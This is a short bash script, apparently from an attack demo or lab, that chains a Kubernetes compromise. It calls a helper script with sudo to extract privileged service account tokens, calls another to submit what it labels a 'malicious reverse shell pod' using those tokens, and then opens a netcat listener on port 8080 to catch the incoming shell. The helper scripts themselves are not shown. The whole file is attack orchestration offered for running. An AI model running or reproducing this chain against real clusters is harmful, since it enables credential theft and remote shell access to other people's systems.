
#!/bin/bash

# Get the directory where this script is located
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "Exctracting token. "
sudo "$SCRIPT_DIR/extract_privileged_tokens.sh"

echo "Creating malicious reverse shell pod, using the found service acount token."
"$SCRIPT_DIR/submit_malicious_pod.sh"

echo "Listening to incoming connections."
nc -l -v 8080